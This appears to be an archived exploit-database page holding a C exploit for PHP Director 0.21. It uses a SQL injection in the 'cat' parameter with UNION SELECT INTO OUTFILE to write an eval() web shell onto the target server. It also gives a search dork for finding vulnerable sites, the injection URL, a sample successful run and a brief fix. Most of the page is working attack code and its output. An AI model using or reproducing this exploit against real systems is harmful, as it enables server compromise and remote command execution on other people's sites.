<html><head><title>PHP Director <= 0.21 (sql into outfile) eval() Injection Exploit</title></head><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;

/* Dork &quot;Powered by PHP Director 0.2&quot;   
   
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
| PHP Director 0.2.1 (sql into outfile) eval() Injection Exploit | 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
  
 {Exploit}-&gt; index.php?cat=%27+UNION+SELECT+1,'lol',3,4,5,6,7,8,9,10,11,12,13,14,15+INTO+OUTFILE+'/var/www/ex.php'/*
 {PHP.ini}-&gt; Magic Quotes off
 {Written}-&gt; by Juri Gianni aka yeat - staker[at]hotmail[dot]it 
 {WhereIs}-&gt; http://sourceforge.net/projects/phpdirector/
 {Compile}-&gt; gcc -o exploit exploit.c 
 
 
 {Details}-&gt; index.php (line 56-58)
  
 56. }elseif (isset($_GET[&quot;cat&quot;])) {
 57. $cat = $_GET[&quot;cat&quot;];
 58. $_query = sprintf(&quot;SELECT SQL_CALC_FOUND_ROWS * FROM pp_files WHERE `category` = '$cat etc..)
  
 {Bug}-&gt; $cat variable is not checked so we have a sql injection
 {Fix}-&gt; $cat = mysql_real_escape_string($_GET['cat']);
 


 yeat@lulz:~/Desktop$ gcc -o exploit exploit.c
 yeat@lulz:~/Desktop$ ./exploit localhost /cms /var/www/shell.php
 Exploit successful..shell: /var/www/shell.php

*/



#define GET  &quot;GET %s/index.php?cat=%s HTTP/1.1\r\n&quot; \
             &quot;Host: %s\r\n&quot; \
             &quot;User-Agent: Links (2.1pre26; Linux 2.6.19-gentoo-r5 x86_64; x)\r\n&quot; \
             &quot;Connection: close\r\n\r\n&quot;

#define Exec  &quot;'+UNION+SELECT+1,2,3,4,'&lt;?eval(stripslashes($_GET[cmd]));?&gt;'&quot;\
              &quot;,6,7,8,9,10,11,12,13,14,15+INTO+OUTFILE+'%s'&quot;


char *getHost (char *host)
{ 
    struct hostent *hp;
    struct in_addr **y;
    
    hp = gethostbyname(host);
    y = (struct in_addr **)hp-&gt;h_addr_list;
    
    return inet_ntoa(**y);
}


int main (int argc,char **argv)
{
    int server,leak;
    char data[1024],html[1024];
    char packet[500],loadsf[500];

    struct sockaddr_in addr;
    
    if (argc &lt; 3) {
       printf(&quot;Usage: %s host path file\n&quot;,argv[0]);
       printf(&quot;RunEx: %s localhost /cms /var/www/shell.php\n&quot;,argv[0]);
       exit(0);
    }   
    
    server = socket(AF_INET,SOCK_STREAM,0);
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons((int)80);
    addr.sin_addr.s_addr = inet_addr(getHost(argv[1]));
    
    leak = connect(server,(struct sockaddr*)&amp;addr,sizeof(addr));
    
    if (leak &lt; 0) {
       printf(&quot;connection refused..try again\n&quot;);
       exit(0);
    }   
    
    snprintf(loadsf,sizeof(loadsf),Exec,argv[3]); 
    strncat(loadsf,&quot;%23&quot;,sizeof(loadsf));   
    snprintf(packet,sizeof(packet),GET,argv[2],loadsf,argv[1]);   
        
    if (send(server,packet,sizeof(packet),0) &lt; 0) {
       printf(&quot;data sent error..\n&quot;);
    }   
       
    while(recv(server,html,sizeof(html),0) &gt; 0) 
    {   
        if (strstr(html,&quot;MySQL&quot;) || strstr(html,&quot;mysql_fetch_array&quot;)) {
           printf(&quot;Exploit unsuccessful..\n&quot;); break;
        } 
        else {  
           printf(&quot;Exploit successful..shell: %s\n&quot;,argv[3]); break;
        }   
   }  
    
    return 0;
}

// milw0rm.com [2009-03-09]</pre></html>